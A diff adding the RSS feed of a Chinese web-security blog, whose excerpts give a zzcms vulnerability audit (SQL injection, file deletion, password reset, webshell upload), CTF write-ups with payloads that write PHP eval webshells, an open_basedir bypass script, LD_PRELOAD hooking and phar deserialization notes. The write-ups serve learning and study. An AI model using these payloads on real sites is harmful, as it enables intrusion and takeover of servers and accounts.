@@ -1,0 +1,160 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Theoyu&#39;s Blog</title>
+    <link>https://theoyu.top/</link>
+    <description>Recent content on Theoyu&#39;s Blog</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>zh-cn</language>
+    <copyright>This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.</copyright>
+    <lastBuildDate>Wed, 19 May 2021 19:25:18 +0800</lastBuildDate><atom:link href="https://theoyu.top/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>zzcms code Audit</title>
+      <link>https://theoyu.top/posts/codeaudit/zzcms/</link>
+      <pubDate>Wed, 19 May 2021 19:25:18 +0800</pubDate>
+      
+      <guid>https://theoyu.top/posts/codeaudit/zzcms/</guid>
+      <description>准备工作 虽然事先准备审这个cms,但是找源码还是花了不少时间，官网只有最新的版本，这里如果大家想要复现就直接下载这里的就好了。
+为了模拟真实环境，我们在phpstudy上配置一下站点,并修改hosts文件即可开始动手啦。
+0x01 sql注入 进入界面,就有一个很明显的搜索框,我们尝试1&#39; or 1=1 #
+发现单引号被转义，search.php包含了/inc/conn.php,而后者又包含了inc/stopsqlin.php，对应代码:
+可以看到这里会对我们POST,GET以及COOKIE中的数据进行转义,那如果想要继续进行下去我们要么就是找到没有包含 /inc/conn.php的组件，要么就是找到拼接sql语句的地方。
+user/check.php是对我们身份进行验证的文件，如果cookie设置有username和password，就会执行一次sql查询,并且该文件奇幻的是没有包含上面说的过滤文件，还自己写了一个过滤函数，还只对username进行过滤,那么我们尝试一下password处。
+不过这个路由设有对验证码的识别，而user/index.php包含了该函数,那我们可以直接在index.php测试。
+那么这里也理所当然可以通过盲注拿数据,不过我在本地搭建的环境比较慢，平均延迟在4秒左右，就没有跑了，师傅们见谅。
+比较遗憾的是管理员路由设置的为session参数验证，无法通过万能密码的方法登陆。
+0x02 任意文件删除 在user/adv.php处，
+不得不说这种对$_REQUEST没有限制的代码真的很恐怖,逻辑其实很简单只要$action等于modify和$img不等于$oldimg即可，并且这里没有对$oldimg过滤导致我们可以直接把../../admin/admin.php删除。
+0x03 网站重装 在Install目录下，step1.php会首先判断是否存在install.lock文件，但是在step2.php及之后的文件都没有对其进行判断,并且step可控。
+0x04 任意密码修改 漏洞点在one/getpassword.php
+elseif($action==&amp;#34;step3&amp;#34; &amp;amp;&amp;amp; @$_SESSION[&amp;#39;username&amp;#39;]!=&amp;#39;&amp;#39;){ $passwordtrue = isset($_POST[&amp;#39;password&amp;#39;])?$_POST[&amp;#39;password&amp;#39;]:&amp;#34;&amp;#34;; $password=md5(trim($passwordtrue)); query(&amp;#34;update zzcms_user set password=&amp;#39;$password&amp;#39;,passwordtrue=&amp;#39;$passwordtrue&amp;#39; where username=&amp;#39;&amp;#34;.@$_SESSION[&amp;#39;username&amp;#39;].&amp;#34;&amp;#39;&amp;#34;); 利用样式和网址重装有些相似，也是POSTaction到step3直接修改密码,但这里需要我们知道被修改用户的$_SESSION[&#39;username&#39;],而在step1中我们可以看到：
+if ($action==&amp;#34;step1&amp;#34;){ $username = isset($_POST[&amp;#39;username&amp;#39;])?$_POST[&amp;#39;username&amp;#39;]:&amp;#34;&amp;#34;; $_SESSION[&amp;#39;username&amp;#39;]=$username; ...... $_SESSION[&#39;username&#39;]有一个被我们赋值的过程，那我们只需先在step1中输入需要修改的username获取session，就可直接跳到step3修改密码。步骤如下：
+然后直接修改密码,把action改为step3即可。
+0x05 反射型xss 在inc/top.php处没有包含inc/conn.php，我们只需要将标签闭合即可实现反射型xss。
+事实上admin用户的后台管理基本上没有什么过滤，存在很多存储型xss,但归于业务原因, 拿到admin权限也就不在乎这个级别漏洞了,感兴趣的师傅可以自行复现。
+0x06 上传webshell 在uploadimg_form.php可以文件上传，不过这个路由非常突兀让我有了一种好像做ctf题的感觉..
+回到正题,我们看看后端是怎么处理我们的文件的:uploadimg.php
+function upfile() { //是否存在文件 if (!is_uploaded_file(@$this-&amp;gt;fileName[tmp_name])){ echo &amp;#34;&amp;lt;script&amp;gt;alert(&amp;#39;请点击“浏览”，先选择您要上传的文件！\\n\\n支持的图片类型为：jpg,gif,png,bmp&amp;#39;);parent.window.close();&amp;lt;/script&amp;gt;&amp;#34;; exit; } //检查文件大小 if ($this-&amp;gt;max_file_size*1024 &amp;lt; $this-&amp;gt;fileName[&amp;#34;size&amp;#34;]){ echo &amp;#34;&amp;lt;script&amp;gt;alert(&amp;#39;文件大小超过了限制！最大只能上传 &amp;#34;.</description>
+    </item>
+    
+    <item>
+      <title>2021 WP汇总</title>
+      <link>https://theoyu.top/posts/2021/</link>
+      <pubDate>Mon, 17 May 2021 20:24:32 +0800</pubDate>
+      
+      <guid>https://theoyu.top/posts/2021/</guid>
+      <description>0x01 NEPCTF 周末比较忙，做了两道题。
+little_trick &amp;lt;?php error_reporting(0); highlight_file(__FILE__); $nep = $_GET[&amp;#39;nep&amp;#39;]; $len = $_GET[&amp;#39;len&amp;#39;]; if(intval($len)&amp;lt;8 &amp;amp;&amp;amp; strlen($nep)&amp;lt;13){ eval(substr($nep,0,$len)); }else{ die(&amp;#39;too long!&amp;#39;); } ?&amp;gt;关于len这个点还挺好说的，-1就绕了，那么题目就变成了限制长度为12的命令执行。方法还挺多的。
+solution 1 hitcon之前做了限制长度4或5的命令执行,4和5都可以了，那12自然不在话下，这里就不过多阐述了。
+solution 2 事实上这题没那么麻烦，因为我们可控制字符还是比较长的，我们先测试一下:
+?nep=`ls&amp;gt;z`;&amp;amp;len=7访问一下z我们发现了
+index.phpnep.phpz很明显flag就在nep.php里，那只需
+&amp;gt;cat *&amp;gt;z再访问z即可。
+solution3 ?nep=`$_GET[a]`;1&amp;amp;len=-1&amp;amp;a=echo &amp;quot;&amp;lt;?php eval(\$_POST[theoyu]);&amp;quot;&amp;gt;theoyu.phpsolution4 这个是看一位老哥的wp时发现的，确实巧妙。 首先鉴于php的弱类型，intval会把字符串数字后给截断，导致比如7;agawg识别为7，然后里用?nep=$len达到内联执行的效果。
+?nep=`$len`;&amp;amp;len=7;echo &amp;quot;&amp;lt;?php @eval(\$_POST[theoyu])?&amp;gt;&amp;quot; &amp;gt; theoyu.php梦里花开牡丹亭  考察php原生类的利用
+ 源码：
+&amp;lt;?php highlight_file(__FILE__); error_reporting(0); include(&amp;#39;shell.php&amp;#39;); class Game{ public $username; public $password; public $choice; public $register; public $file; public $filename; public $content; public function __construct() { $this-&amp;gt;username=&amp;#39;user&amp;#39;; $this-&amp;gt;password=&amp;#39;user&amp;#39;; } public function __wakeup(){ if(md5($this-&amp;gt;register)===&amp;#34;21232f297a57a5a743894a0e4a801fc3&amp;#34;){ $this-&amp;gt;choice=new login($this-&amp;gt;file,$this-&amp;gt;filename,$this-&amp;gt;content); }else{ $this-&amp;gt;choice = new register(); } } public function __destruct() { $this-&amp;gt;choice-&amp;gt;checking($this-&amp;gt;username,$this-&amp;gt;password); } } class login{ public $file; public $filename; public $content; public function __construct($file,$filename,$content) { $this-&amp;gt;file=$file; $this-&amp;gt;filename=$filename; $this-&amp;gt;content=$content; } public function checking($username,$password) { if($username===&amp;#39;admin&amp;#39;&amp;amp;&amp;amp;$password===&amp;#39;admin&amp;#39;){ $this-&amp;gt;file-&amp;gt;open($this-&amp;gt;filename,$this-&amp;gt;content); die(&amp;#39;login success you can to open shell file!</description>
+    </item>
+    
+    <item>
+      <title>蓝帽杯 One Pointer PHP</title>
+      <link>https://theoyu.top/posts/bluehat/</link>
+      <pubDate>Tue, 04 May 2021 21:30:20 +0800</pubDate>
+      
+      <guid>https://theoyu.top/posts/bluehat/</guid>
+      <description>两个web，一个js小游戏代码审计1小时，玩10秒弹flag什么鬼，还有一个就是这道全场1解题。
+&amp;lt;?php class User{ public $count; } if($user=unserialize($_COOKIE[&amp;#34;data&amp;#34;])){ $count[++$user-&amp;gt;count]=1; if($count[]=1){ $user-&amp;gt;count+=1; setcookie(&amp;#34;data&amp;#34;,serialize($user)); }else{ eval($_GET[&amp;#34;backdoor&amp;#34;]); } }else{ $user=new User; $user-&amp;gt;count=1; setcookie(&amp;#34;data&amp;#34;,serialize($user)); } ?&amp;gt;题目给了源码，第一关是数组溢出，需要$count[]=1，这一步赋值操作报错即可命令执行，貌似php的溢出长度和操作系统有关，我在本地尝试的时候2^31-1即可绕过，但题目上需要2*63-1，不过关系不大，然后蚁剑连上去即可。
+add_api.php?backdoor=eval($_POST[theoyu])；蚁剑设置Cookiedata=O%3a4%3a&amp;quot;User&amp;quot;%3a1%3a{s%3a5%3a&amp;quot;count&amp;quot;%3bi%3a9223372036854775806%3b}发现只能看当前目录，多半是open_basedir设置了只有当前目录，不过这个好说，p神有文章绕过这个，然后看了一眼phpinfo() &amp;hellip;
+putenv 居然被过滤了！前几天还专门研究了这个，不过在phpinfo() 中发现Server API =FPM/FastCGI ，之前学SSRF 的时候有接触过这个，可以通过这个RCE，但好像根本没有ssrf的入口..思绪在这里就断了
+好像没啥会的了，就尝试读一下配置文件，读取方式如下：
+&amp;lt;?php mkdir(&amp;#39;theoyu&amp;#39;); chdir(&amp;#39;theoyu&amp;#39;); ini_set(&amp;#39;open_basedir&amp;#39;,&amp;#39;..&amp;#39;); chdir(&amp;#39;..&amp;#39;);chdir(&amp;#39;..&amp;#39;);chdir(&amp;#39;..&amp;#39;);chdir(&amp;#39;..&amp;#39;); ini_set(&amp;#39;open_basedir&amp;#39;,&amp;#39;/&amp;#39;); // 此处用来读目录 // $a = new DirectoryIterator(&amp;#34;glob:///etc/nginx/sites-enabled/*&amp;#34;); // foreach($a as $f){ // echo($f-&amp;gt;__toString().&amp;#39;&amp;lt;br&amp;gt;&amp;#39;); // }  //此处用来读文件 echo file_get_contents(&amp;#39;/etc/nginx/sites-enabled/default&amp;#39;); ?&amp;gt;这个读取过程也是很折磨，大概就是一点一点摸索吧，在配置文件发现了fastcgi的开放端口&amp;hellip;然后就不会了&amp;hellip;
+看wp发现师傅们用的是ftp 与 php-fpm 对话 RCE，具体可参考这一篇文章，后续我应该也会专门总结一篇关于fastcgi和fpm的文章。
+那有了ftp的对话，思路就很清晰了，通过本地vps起一个ftp服务，在靶机上将fpmRCE的payload发送给ftp，再又ftp转发给靶机的9001端口形成ssrf，不得不说实在太巧妙了。
+fastcgi 的攻击脚本有php和go的，经过测试都可以运行，在php_value 处把disable_function置空即可。有的师傅也利用了extension去加载**.so**反弹shell，不过我感觉既然蚁剑已经可以连接了，就不需要这一步。</description>
+    </item>
+    
+    <item>
+      <title>利用LD_PRELOAD绕过disable_function</title>
+      <link>https://theoyu.top/posts/disabled_function/</link>
+      <pubDate>Mon, 03 May 2021 10:24:32 +0800</pubDate>
+      
+      <guid>https://theoyu.top/posts/disabled_function/</guid>
+      <description>什么是LD_PRELOAD 在Linux的动态链接库的世界中，LD_PRELOAD是一个环境变量，它可以影响程序的运行时的链接（Runtime linker），允许你定义在程序运行前优先加载的动态链接库。一方面，我们可以以此功能来使用自己的或是更好的函数（无需别人的源码），而另一方面，我们也可以以向别人的程序注入程序，从而达到特定的目的。
+这里我们举行一个密码验证的例子，来初步探究LD_PRELOAD与动态链接的关系。
+/* login.c */ #include &amp;lt;stdio.h&amp;gt;#include&amp;lt;string.h&amp;gt;int main(int argc,char **argv){ char passwd[]=&amp;#34;password&amp;#34;; if(!strcmp(passwd,argv[1])){ printf(&amp;#34;Correct Password!/n&amp;#34;); return 1; } printf(&amp;#34;Invalid Password!/n&amp;#34;); return 0; } 在上面这段程序中，我们使用了strcmp函数来判断两个字符串是否相等。下面，我们使用一个动态函数库来重载strcmp函数：
+/* hack.c */ #include &amp;#34;stdio.h&amp;#34;#include &amp;lt;string.h&amp;gt;int strcmp(const char *s1,const char *s2){ printf(&amp;#34;hacking! s1=%s,s2=%s\n&amp;#34;,s1,s2); // return 0 indicates that 2 strings are equial  return 0 ; } 编译程序：
+☁ c gcc login.c -o login ☁ c gcc -shared hack.c -o hack.so 运行一下:
+☁ c .</description>
+    </item>
+    
+    <item>
+      <title>某群一道反序列化题</title>
+      <link>https://theoyu.top/posts/unserialize1/</link>
+      <pubDate>Sun, 02 May 2021 16:24:32 +0800</pubDate>
+      
+      <guid>https://theoyu.top/posts/unserialize1/</guid>
+      <description>五一忽然就要过了..感觉要学的好没学，考试也没复习，早上12点在某ctf群看到在讨论这道题，就起床做做了&amp;hellip;
+ 题目给出源码：
+&amp;lt;?php highlight_file(__FILE__); class main{ public $settings; public $params; public function __construct(){ $this-&amp;gt;settings=array( &amp;#39;display_errors&amp;#39;=&amp;gt;&amp;#39;On&amp;#39;, &amp;#39;allow_url_fopen&amp;#39;=&amp;gt;&amp;#39;On&amp;#39; ); $this-&amp;gt;params=array(); } public function __wakeup(){ foreach ($this-&amp;gt;settings as $key =&amp;gt; $value) { ini_set($key, $value); } } public function __destruct(){ file_put_contents(&amp;#39;settings.inc&amp;#39;, unserialize($this-&amp;gt;params)); } } unserialize($_GET[&amp;#39;data&amp;#39;]); 法一 反序列化回调函数+后缀文件包含 给了源码就好说，在本地测试一下。我们可以对settings.inc文件进行写入，那自然想到的就是写入一句话然后进行文件包含，找一下有没有原生调用函数的方法。
+就在官网手册的unserialize() 处发现了这个函数，官方给出的实例是这样的
+&amp;lt;?php $serialized_object=&amp;#39;O:1:&amp;#34;a&amp;#34;:1:{s:5:&amp;#34;value&amp;#34;;s:3:&amp;#34;100&amp;#34;;}&amp;#39;; // unserialize_callback_func 从 PHP 4.2.0 起可用 ini_set(&amp;#39;unserialize_callback_func&amp;#39;, &amp;#39;mycallback&amp;#39;); // 设置您的回调函数  function mycallback($classname) { // 只需包含含有类定义的文件  // $classname 指出需要的是哪一个类 } ?</description>
+    </item>
+    
+    <item>
+      <title>about the blog</title>
+      <link>https://theoyu.top/posts/something/</link>
+      <pubDate>Sat, 01 May 2021 07:01:59 +0800</pubDate>
+      
+      <guid>https://theoyu.top/posts/something/</guid>
+      <description>删了绝大多数之前博客,有技术性的,有碎碎叨叨的,但更多的是没有什么思考的wp。或许学的越多,看问题的角度越多,就越会对上一个阶段的自己不满意。在我看来之前的记录大多都是记流水帐似的任务,又或许是看了很多师傅的博客，想如果我也能总结出这样的文章，那我是不是也会变得像师傅这样厉害呢?
+转眼就到了大二的尾巴,翻了翻之前大多数的博客,可能我缺少的是大师傅那样静下心来思考的毅力。不可否认web安全就是这样浮躁,东西杂轮子多,不加以思考的用别人的轮子去解决问题很难有所进步。让我感触最深的还是p神和飘零师傅,看他们从底层开始学习,哪怕一个简单细小的地方也可以总结出有深度的内容,这让我很是惭愧。几个月前的我还嚷嚷着我这辈子也不可能学java的,php的意义就是全是漏洞，golang天下第一调打c++，现在看来不过是对自己没有扎实基础的逃避，无论什么东西，存在即意义,或许我现在还不晚,还有足够的时间去捣鼓我喜欢做的事情。
+最后,希望大家与博客战斗的同时,不要忘记——博客的初心是记录。
+   2019-12-23——2020-11-17
+博客园
+  2020-11-17——2021-5-1
+Typecho
+  2021-5-1——Now
+Hugo
+  </description>
+    </item>
+    
+    <item>
+      <title>About Me</title>
+      <link>https://theoyu.top/about-me/</link>
+      <pubDate>Fri, 30 Apr 2021 00:00:00 +0000</pubDate>
+      
+      <guid>https://theoyu.top/about-me/</guid>
+      <description>████████╗ ██╗ ██╗ ███████╗ ██████╗ ██╗ ██╗ ██╗ ██╗ ╚══██╔══╝ ██║ ██║ ██╔════╝ ██╔═══██╗ ╚██╗ ██╔╝ ██║ ██║ ██║ ███████║ █████╗ ██║ ██║ ╚████╔╝ ██║ ██║ ██║ ██╔══██║ ██╔══╝ ██║ ██║ ╚██╔╝ ██║ ██║ ██║ ██║ ██║ ███████╗ ╚██████╔╝ ██║ ╚██████╔╝ ╚═╝ ╚═╝ ╚═╝ ╚══════╝ ╚═════╝ ╚═╝ ╚═════╝ </description>
+    </item>
+    
+    <item>
+      <title>利用 phar 拓展 php 反序列化漏洞攻击面</title>
+      <link>https://theoyu.top/posts/phar/</link>
+      <pubDate>Mon, 22 Feb 2021 11:19:11 +0800</pubDate>
+      
+      <guid>https://theoyu.top/posts/phar/</guid>
+      <description>phar文件结构 所有的Phar archives包含以下3-4个部分。
+ a stub a manifest describing the contents the file contents [optional] a signature for verifying Phar integrity (phar file format only)  a stub 可以理解为一个标志，格式为xxx&amp;lt;?php xxx; __HALT_COMPILER();?&amp;gt;，前面内容不限，但必须以__HALT_COMPILER();?&amp;gt;来结尾，否则phar扩展将无法识别这个文件为phar文件。通常使用setStub()设置存根。
+a manifest phar文件本质上是一种压缩文件，其中每个被压缩文件的权限、属性等信息都放在这部分。这部分还会以序列化的形式存储用户自定义的meta-data，也是反序列化中我们可以利用的部分。
+file contents 被压缩文件的内容。
+a signature demo 通过一个简单案例创建phar文件，记住要把php.ini中的phar.readonly设置为Off。
+&amp;lt;?php class TestObject { } @unlink(&amp;#34;phar.phar&amp;#34;); $phar = new Phar(&amp;#34;phar.phar&amp;#34;); //后缀名必须为phar  $phar-&amp;gt;setStub(&amp;#34;&amp;lt;?php __HALT_COMPILER(); ?&amp;gt;&amp;#34;); //设置stub  $o = new TestObject(); $phar-&amp;gt;setMetadata($o); //将自定义的meta-data存入manifest  $phar-&amp;gt;addFile(&amp;#39;hack.php&amp;#39;);//添加要压缩的文件 ?&amp;gt;可以看到meta-data是以序列化的形式存储的：
+有序列化数据必然会有反序列化操作，php一大部分的文件系统函数在通过phar://伪协议解析phar文件时，都会将meta-data进行反序列化，测试后受影响的函数如下：
+   受影响函数列表        fileatime filectime file_exists file_get_contents   file_put_contents file filegroup fopen   fileinode filemtime fileowner fileperms   is_dir is_excutable is_file is_link   is_readable is_writable is_writeable parse_ini_file   copy unlink stat readfile    用一个小案例加以证明：</description>
+    </item>
+    
+    <item>
+      <title>浅谈php序列化与反序列化</title>
+      <link>https://theoyu.top/posts/%E5%BA%8F%E5%88%97%E5%8C%96/</link>
+      <pubDate>Mon, 09 Nov 2020 23:30:20 +0800</pubDate>
+      
+      <guid>https://theoyu.top/posts/%E5%BA%8F%E5%88%97%E5%8C%96/</guid>
+      <description>基础知识  现在我们都会在淘宝上买桌子，这时候一般都会把它拆掉成板子，再装到箱子里面，就可以快递寄出去了，这个过程就类似我们的序列化的过程（把数据转化为可以存储或者传输的形式）。当买家收到货后，就需要自己把这些板子组装成桌子的样子，这个过程就像反序列的过程（转化成当初的数据对象）。
+也就是说，序列化的目的是方便传输和存储。
+在PHP应用中，序列化和反序列化一般用做缓存，比如session，cookie等。
+  PHP序列化：php为了方便进行数据的传输，允许把复杂的数据结构，压缩到一个字符串中，使用serialize()函数。 PHP反序列化：将被压缩为字符串的复杂数据结构，重新恢复，使用unserialize()函数。 PHP反序列化漏洞：如果代码中使用了反序列化 unserialize()函数，并且参数可控，且程序没有对用户输入的反序列化字符串进行校验，那么可以通过在本地构造序列化字符串，同时利用PHP中的一系列magic方法来达到想要实现的目的，如控制对象内部的变量甚至是函数。  序列化格式 &amp;lt;?php $str=&amp;#39;Theoyu&amp;#39;; $bool=true; $null=NULL; $arr=array(&amp;#39;a&amp;#39;=&amp;gt;1,&amp;#39;b&amp;#39;=&amp;gt;2); class A { public $x; private $y; public function __construct($x,$y) { $this-&amp;gt;x=$x; $this-&amp;gt;y=$y; } } $test=new A(3,&amp;#34;theoyu&amp;#34;); echo(serialize($str).&amp;#39;&amp;lt;/br&amp;gt;&amp;#39;); //s:6:&amp;#34;Theoyu&amp;#34;; echo(serialize($bool).&amp;#39;&amp;lt;/br&amp;gt;&amp;#39;); //b:1; echo(serialize($null).&amp;#39;&amp;lt;/br&amp;gt;&amp;#39;); //N; echo(serialize($arr).&amp;#39;&amp;lt;/br&amp;gt;&amp;#39;); //a:2{s:1:&amp;#34;a&amp;#34;;i:1;s:1:&amp;#34;b&amp;#34;;i:2;} echo(serialize($test).&amp;#39;&amp;lt;/br&amp;gt;&amp;#39;); //O:1:&amp;#34;A&amp;#34;:2:{s:1:&amp;#34;x&amp;#34;;i:3;s:4:&amp;#34;Ay&amp;#34;;s:6:&amp;#34;theoyu&amp;#34;;}  ?&amp;gt;序列化对不同类型得到的字符串格式为：
+ string ： s:size:value; Integer： i:value; Boolean b:value;(1 or 0) NULL N; Array a:size:{key definition;value definition;······}definition 类似string or Integer Object O:类名长度:&amp;ldquo;类名&amp;rdquo;:属性数量:{属性类型:属性名长度:属性名:value definition······}  Magic methods PHP16个魔术方法 PHP中把比双下划线__开头的方法称为魔术方法，这些发在达到某些条件时会自动被调用：</description>
+    </item>
+    
+  </channel>
+</rss>
